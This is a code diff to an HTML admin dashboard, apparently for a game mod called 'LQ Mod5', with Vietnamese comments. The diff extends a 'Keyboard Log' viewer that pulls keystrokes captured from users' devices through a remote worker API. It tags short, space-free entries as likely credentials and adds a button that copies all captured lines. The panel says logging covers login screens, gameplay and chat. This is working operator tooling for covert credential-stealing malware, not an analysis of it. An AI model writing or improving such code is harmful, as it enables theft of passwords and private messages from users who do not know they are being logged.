@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔐 Key Manager - LQ Mod3</title>
+<title>🔐 Key Manager - LQ Mod5</title>
 <style>
   :root {
     --bg: #0a0e1a;
@@ -1627,43 +1627,46 @@ async function openKeylogModal(deviceId, deviceName) {
   klAutoRefreshTimer = setInterval(() => klLoadLog(deviceId), 3000);
 }
 
+// Lưu lines hiện tại để copy all
+let klCurrentLines = [];
+
 async function klLoadLog(deviceId) {
   const el = document.getElementById('keylog-body');
-  const isFirstLoad = el.innerHTML.includes('Đang tải');
-  if (isFirstLoad) {
+  const isFirstLoad = !el.innerHTML || el.innerHTML.includes('Đang tải');
+  if (isFirstLoad)
     el.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px">Đang tải...</div>';
-  }
   try {
     const r = await fetch(WORKER_URL + '/api/admin/keylog?device=' + encodeURIComponent(deviceId), {
       headers: { 'X-Admin-Token': ADMIN_TOKEN }
     });
     const data = await r.json();
-    const lines = (data.lines || []).slice().reverse(); // mới nhất lên đầu
-    if (lines.length === 0) {
+    klCurrentLines = (data.lines || []).slice().reverse(); // mới nhất lên đầu
+    if (klCurrentLines.length === 0) {
       el.innerHTML =
         '<div style="text-align:center;color:var(--text2);padding:40px;line-height:2">' +
         '<div style="font-size:28px">⌨️</div>' +
         '<div>Chưa có dữ liệu bàn phím.</div>' +
-        '<div style="font-size:11px;opacity:.6">Sẽ hiện ngay khi người dùng gõ bất kỳ thứ gì (bao gồm màn đăng nhập game).</div>' +
+        '<div style="font-size:11px;opacity:.6">Sẽ hiện ngay khi người dùng gõ bất kỳ thứ gì (màn login, in-game, chat).</div>' +
         '</div>';
+      document.getElementById('kl-copy-btn').style.display = 'none';
       return;
     }
-    const total = lines.length;
-    el.innerHTML = lines.map((l, i) => {
+    document.getElementById('kl-copy-btn').style.display = '';
+    const total = klCurrentLines.length;
+    el.innerHTML = klCurrentLines.map((l, i) => {
       const ts = l.ts ? new Date(l.ts).toLocaleString('vi-VN', {
         day:'2-digit', month:'2-digit', year:'numeric',
         hour:'2-digit', minute:'2-digit', second:'2-digit'
       }) : '';
       const num = total - i;
-      // Nhận dạng sơ bộ: nếu text ngắn (<= 40 ký tự) và không có khoảng trắng
-      // thì có thể là key/mật khẩu đăng nhập → highlight khác màu
       const txt = l.text || '';
-      const isLoginLike = txt.length > 0 && txt.length <= 40 && !/\s/.test(txt);
-      const badge = isLoginLike
-        ? '<span class="kl-badge">🔑 Login</span>'
-        : '<span class="kl-badge kl-badge-chat">💬 Chat/Input</span>';
-      return `<div class="kl-row${isLoginLike ? ' kl-row-login' : ''}">
-        <div class="kl-ts">#${num} &nbsp;·&nbsp; ${ts} &nbsp;${badge}</div>
+      // Nhận dạng: không có khoảng trắng + ngắn → có thể là key/pass đăng nhập
+      const isCredLike = txt.length > 0 && txt.length <= 50 && !/\s/.test(txt);
+      return `<div class="kl-row${isCredLike ? ' kl-row-cred' : ''}">
+        <div class="kl-ts">
+          <span>#${num} · ${ts}</span>
+          ${isCredLike ? '<span class="kl-badge">🔑 Credential</span>' : '<span class="kl-badge kl-badge-chat">💬 Text</span>'}
+        </div>
         <div class="kl-text">${escapeHtml(txt)}</div>
       </div>`;
     }).join('');
@@ -1671,6 +1674,14 @@ async function klLoadLog(deviceId) {
     if (isFirstLoad)
       el.innerHTML = '<div style="color:var(--red);padding:20px">Lỗi: ' + e.message + '</div>';
   }
+}
+
+function klCopyAll() {
+  if (!klCurrentLines.length) return;
+  const text = klCurrentLines.map(l =>
+    `[${l.ts ? new Date(l.ts).toLocaleString('vi-VN') : '?'}] ${l.text}`
+  ).join('\n');
+  navigator.clipboard.writeText(text).then(() => showToast('Đã copy ' + klCurrentLines.length + ' dòng', 'ok'));
 }
 
 async function clearKeylog() {
@@ -1694,8 +1705,9 @@ function escapeHtml(s) {
     <button class="close" onclick="closeModal('keylog-modal')">✕</button>
     <h3 id="keylog-device-title" style="margin:0 0 14px">⌨️ Keyboard Log</h3>
     <input type="hidden" id="keylog-device-id-store">
-    <div style="display:flex;gap:8px;margin-bottom:12px">
+    <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">
       <button class="btn btn-ghost" style="font-size:12px" onclick="klLoadLog(document.getElementById('keylog-device-id-store').value)">🔄 Refresh</button>
+      <button id="kl-copy-btn" class="btn btn-ghost" style="font-size:12px;display:none" onclick="klCopyAll()">📋 Copy tất cả</button>
       <button class="btn" style="font-size:12px;background:var(--red);color:#fff" onclick="clearKeylog()">🗑 Xoá log</button>
     </div>
     <div id="keylog-body" style="flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:6px;padding-right:4px"></div>
@@ -1704,11 +1716,11 @@ function escapeHtml(s) {
 
 <style>
 .kl-row       { background:var(--surface2);border-radius:8px;padding:10px 14px;border-left:3px solid #7c3aed; }
-.kl-row-login { border-left-color:#f59e0b; background:rgba(245,158,11,.08); }
-.kl-ts        { font-size:10px;color:var(--text2);margin-bottom:4px;display:flex;align-items:center;gap:6px;flex-wrap:wrap; }
-.kl-text      { font-size:13px;color:var(--text);word-break:break-all;font-family:monospace; }
-.kl-badge      { font-size:9px;padding:1px 6px;border-radius:20px;background:#7c3aed22;color:#a78bfa;border:1px solid #7c3aed44; }
-.kl-badge-chat { background:#0ea5e922;color:#38bdf8;border-color:#0ea5e944; }
+.kl-row-cred  { border-left-color:#f59e0b;background:rgba(245,158,11,.07); }
+.kl-ts        { font-size:10px;color:var(--text2);margin-bottom:5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap; }
+.kl-text      { font-size:13px;color:var(--text);word-break:break-all;font-family:monospace;line-height:1.5; }
+.kl-badge     { font-size:9px;padding:2px 7px;border-radius:20px;background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.3);white-space:nowrap; }
+.kl-badge-chat{ background:rgba(99,102,241,.15);color:#a5b4fc;border-color:rgba(99,102,241,.3); }
 </style>
 </body>
 </html>
